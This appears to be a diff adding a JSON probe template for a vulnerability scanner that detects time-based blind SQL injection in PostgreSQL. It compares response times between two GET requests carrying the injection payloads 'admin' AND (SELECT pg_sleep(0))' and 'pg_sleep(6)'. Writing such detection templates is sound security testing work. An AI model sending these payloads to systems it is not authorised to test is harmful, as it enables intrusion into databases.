@@ -1,0 +1,31 @@
+{
+  "name": "web/SQLi time-based blind PostgreSQL",
+  "description": "[high] Proves time-based blind SQLi (PostgreSQL): two structurally identical injections differing ONLY in pg_sleep(0) vs pg_sleep(6); latency_delta >= 3.5s isolates DB execution from network noise. Keywords: sqli blind time-based postgresql pg_sleep injection. ctrl: benign/no-injection request stays fast -> not falsified. probe_url = endpoint WITHOUT query string; injection rides param u.",
+  "cwe": "CWE-89",
+  "requests": {
+    "baseline": {
+      "method": "GET",
+      "url": "{{probe_url}}?u=admin%27%20AND%20(SELECT%20pg_sleep(0))--%20-"
+    },
+    "payload": {
+      "method": "GET",
+      "url": "{{probe_url}}?u=admin%27%20AND%20(SELECT%20pg_sleep(6))--%20-"
+    }
+  },
+  "conditions": [
+    {
+      "type": "latency_delta",
+      "request_a": "baseline",
+      "request_b": "payload",
+      "min_delta": 3.5
+    }
+  ],
+  "params": [
+    "probe_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "8a13468f810d",
+  "created": "2026-11-05T18:01:37.085987+00:00",
+  "last_used": "2026-11-05T18:01:37.085987+00:00"
+}
